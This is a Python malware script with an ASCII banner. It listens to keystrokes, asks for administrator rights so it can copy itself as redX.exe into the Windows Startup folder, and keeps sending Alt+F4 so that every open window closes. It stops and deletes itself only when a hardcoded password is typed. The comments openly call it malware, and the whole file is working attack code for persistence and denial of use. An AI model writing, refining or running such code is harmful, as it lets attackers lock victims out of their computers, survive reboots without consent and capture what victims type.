'''

.%%%%%....%%%%...%%..%%..%%%%%%..%%%%%%..%%...............%%%%...........%%%%%%.
.%%..%%..%%..%%..%%%.%%....%%....%%......%%..............%%..%%..............%%.
.%%..%%..%%%%%%..%%.%%%....%%....%%%%....%%..............%%..................%%.
.%%..%%..%%..%%..%%..%%....%%....%%......%%..............%%..%%....%%....%%..%%.
.%%%%%...%%..%%..%%..%%..%%%%%%..%%%%%%..%%%%%%...........%%%%.....%%.....%%%%..
................................................................................

'''
from pynput import keyboard
import os
import pyautogui as gui
import pyuac
import shutil

keyList = []  # This uses list data collection to contain listened keys.
passwd = "j4nda"  # One word to stop this all. (Don't use whitespace or any special characters)
run = True  # Initialization
dump = ""  # Initialization


def on_press(key):  # Processing the keys
    global dump
    try:
        keyboardListen = key.char
        keyList.append(keyboardListen)  # Appending to the data collection
        dump = "".join(keyList)  # Format list to string
        # print(dump)  # Debugging

    except:
        pass


def copyStartUp():
    if not os.path.exists(
            "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe"):  # If malware not exists in the path

        if not pyuac.isUserAdmin():
            pyuac.runAsAdmin()  # Asks admin permission for copying the malware

        else:  # If admin permission already granted
            shutil.copy(os.getcwd() + "\\redX.exe",
                        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")  # Copy itself in the startup folder


def eradicateCheck():
    global run
    if passwd in dump:  # If the password string tracked in the dump variable
        listener.stop()  # Stop listening keystrokes
        os.remove(
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe")  # Deletes the startup version
        run = False  # Stopping the loop
        os.remove(os.getcwd() + "\\redX.exe")  # Tries to delete itself


listener = keyboard.Listener(on_press=on_press)  # Listen keystrokes
listener.start()
while run:

    try:
        eradicateCheck()  # Eradicate me or not yet?
        copyStartUp()  # Copy to startup folder
        gui.hotkey("alt", "f4")

    except:
        pass
